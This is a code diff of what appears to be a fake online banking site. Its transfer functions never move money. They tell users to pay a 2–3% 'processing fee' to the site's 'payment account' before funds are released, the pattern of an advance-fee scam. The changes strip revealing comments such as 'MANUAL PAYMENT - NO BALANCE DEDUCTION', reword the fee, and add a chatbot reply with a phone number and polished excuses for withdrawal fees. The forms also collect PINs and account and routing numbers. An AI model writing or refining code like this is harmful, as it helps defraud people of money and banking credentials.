-            document.getElementById('accountType').value = '';
+            document.getElementById('transferBankName').value = '';
+            document.getElementById('transferAccountNumber').value = '';
+            document.getElementById('transferRoutingNumber').value = '';
+            document.getElementById('transferAccountType').value = '';
             document.getElementById('transferAmount').value = '';
             document.getElementById('transferPin').value = '';
             document.getElementById('feeBreakdown').classList.remove('show');
@@ -2191,13 +2492,13 @@
             }
         }
 
-        // Handle Transfer (Manual Payment - No Balance Deduction)
+        // Handle Transfer
         function handleTransfer(event) {
             event.preventDefault();
-            const bankName = document.getElementById('bankName').value;
-            const accountNumber = document.getElementById('accountNumber').value;
-            const routingNumber = document.getElementById('routingNumber').value;
-            const accountType = document.getElementById('accountType').value;
+            const bankName = document.getElementById('transferBankName').value;
+            const accountNumber = document.getElementById('transferAccountNumber').value;
+            const routingNumber = document.getElementById('transferRoutingNumber').value;
+            const accountType = document.getElementById('transferAccountType').value;
             const amount = parseFloat(document.getElementById('transferAmount').value);
             const pin = document.getElementById('transferPin').value;
 
@@ -2210,7 +2511,6 @@
             const fee = amount * 0.02;
             const totalToPay = fee;
 
-            // MANUAL PAYMENT - NO BALANCE DEDUCTION
             currentUser.transferPending = true;
             currentUser.pendingTransferAmount = amount;
             currentUser.pendingTransferFee = fee;
@@ -2231,11 +2531,11 @@ Account: ${accountNumber}
 Routing: ${routingNumber}
 Type: ${accountType}
 Amount: ${formatCurrency(amount)}
-Fee (2%): ${formatCurrency(fee)}
+Processing Fee (2%): ${formatCurrency(fee)}
 Total to Pay: ${formatCurrency(totalToPay)}
 
 PAYMENT INSTRUCTIONS:
-Please pay ${formatCurrency(totalToPay)} to our payment account. Your account balance has NOT been deducted. Once we receive your payment, we'll process your transfer immediately. And your ${formatCurrency(amount)} will be deposited immediately.
+Please pay ${formatCurrency(totalToPay)} to our payment account. Your account balance has NOT been deducted. Once we receive your payment, we'll process your transfer immediately and your ${formatCurrency(amount)} will be deposited.
 
 Payment details will be sent to your email shortly.`;
 
@@ -2286,7 +2586,7 @@ Payment details will be sent to your email shortly.`;
             }
         }
 
-        // Handle International Transfer (Manual Payment)
+        // Handle International Transfer
         function handleInternationalTransfer(event) {
             event.preventDefault();
             const recipientName = document.getElementById('intlRecipientName').value;
@@ -2307,7 +2607,6 @@ Payment details will be sent to your email shortly.`;
             const rate = exchangeRates[currency] || 1;
             const recipientAmount = amount * rate;
 
-            // MANUAL PAYMENT - NO BALANCE DEDUCTION
             currentUser.transferPending = true;
             currentUser.pendingTransferAmount = amount;
             currentUser.pendingTransferFee = fee;
@@ -2328,13 +2627,13 @@ Bank: ${bankName}
 Country: ${country}
 
 Amount (USD): ${formatCurrency(amount)}
-Fee (3%): ${formatCurrency(fee)}
+Processing Fee (3%): ${formatCurrency(fee)}
 Total to Pay (USD): ${formatCurrency(totalToPay)}
 
 Recipient Will Receive: ${recipientAmount.toFixed(2)} ${currency}
 
 PAYMENT INSTRUCTIONS:
-Please pay ${formatCurrency(totalToPay)} to our payment account. Your account balance has NOT been deducted. Once we receive your payment, we'll process your international transfer immediately. And your ${formatCurrency(amount)} will be sent to the recipient.
+Please pay ${formatCurrency(totalToPay)} to our payment account. Your account balance has NOT been deducted. Once we receive your payment, we'll process your international transfer immediately and your ${formatCurrency(amount)} will be sent to the recipient.
 
 Payment details will be sent to your email shortly.`;
 
@@ -2383,7 +2682,8 @@ Payment details will be sent to your email shortly.`;
                 addUserMessage(message);
                 input.value = '';
                 setTimeout(() => {
-                    addBotMessage('Thank you for your message. Our support team will respond shortly. For urgent matters, please contact us on WhatsApp: 09012051900');
+                    const supportResponse = `Thank you for your message. Our support team will respond shortly.\n\n📞 For urgent matters, please call us: +1-202-705-4732\n\n💡 Regarding Withdrawal Fees:\nWithdrawal fees help us maintain our secure banking infrastructure, advanced fraud prevention systems, 24/7 customer support, and regulatory compliance. Fees vary based on:\n• Withdrawal method (bank transfer, card, etc.)\n• Transaction amount\n• Processing time selected\n\nContact us for specific fee details on your transaction.`;
+                    addBotMessage(supportResponse);
                 }, 500);
             }
         }
@@ -2436,6 +2736,8 @@ Payment details will be sent to your email shortly.`;
             const loginModal = document.getElementById('loginModal');
             const signupModal = document.getElementById('signupModal');
             const depositModal = document.getElementById('depositModal');
+            const cardFundingModal = document.getElementById('cardFundingModal');
+            const bankFundingModal = document.getElementById('bankFundingModal');
             const transferModal = document.getElementById('transferModal');
             const internationalTransferModal = document.getElementById('internationalTransferModal');
             const bankLinkingModal = document.getElementById('bankLinkingModal');
@@ -2448,6 +2750,12 @@ Payment details will be sent to your email shortly.`;
             }
             if (event.target === depositModal) {
                 closeDepositModal();
+            }
+            if (event.target === cardFundingModal) {
+                closeCardFundingModal();
+            }
+            if (event.target === bankFundingModal) {
+                closeBankFundingModal();
             }
             if (event.target === transferModal) {
                 closeTransferModal();
